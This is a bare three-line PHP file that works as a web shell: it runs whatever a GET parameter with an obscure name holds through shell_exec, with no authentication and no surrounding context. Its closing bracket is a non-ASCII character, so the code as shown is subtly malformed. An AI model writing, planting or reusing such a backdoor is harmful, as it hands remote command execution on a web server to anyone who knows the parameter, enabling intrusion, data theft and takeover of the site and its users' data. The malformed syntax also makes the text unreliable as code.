<?php
shell_exec($_GET['u9huoYCf'〕);
?>
